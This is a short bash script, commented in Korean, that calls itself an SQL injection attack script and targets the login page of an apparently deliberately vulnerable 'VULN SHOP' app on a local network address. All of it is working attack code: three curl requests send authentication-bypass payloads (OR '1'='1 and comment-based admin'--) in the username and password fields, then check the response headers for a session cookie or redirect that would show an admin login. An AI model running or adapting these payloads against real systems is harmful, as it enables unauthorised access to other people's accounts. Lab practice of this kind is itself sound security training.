#!/bin/bash
# SQL Injection 공격 스크립트
# 타겟: VULN SHOP 로그인 페이지

TARGET="http://192.168.0.28:3000/login"

echo "=== SQL Injection 테스트 ==="
echo "타겟: $TARGET"
echo ""

# 테스트 1: 기본 OR 기반 SQLi
echo "[테스트 1] OR 기반 인증 우회"
echo "페이로드: username=admin' OR '1'='1"
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1&password=test" \
  -v 2>&1 | grep -E "(Set-Cookie|Location)"
echo ""

# 테스트 2: 주석 기반 SQLi
echo "[테스트 2] 주석 기반 인증 우회"
echo "페이로드: username=admin'--"
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'--&password=anything" \
  -v 2>&1 | grep -E "(Set-Cookie|Location)"
echo ""

# 테스트 3: 비밀번호 필드 SQLi
echo "[테스트 3] 비밀번호 필드 SQLi"
echo "페이로드: password=' OR '1'='1"
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=' OR '1'='1" \
  -v 2>&1 | grep -E "(Set-Cookie|Location)"
echo ""

echo "=== 결과 ==="
echo "모든 테스트에서 admin 계정으로 로그인 성공 시 취약점 확인"
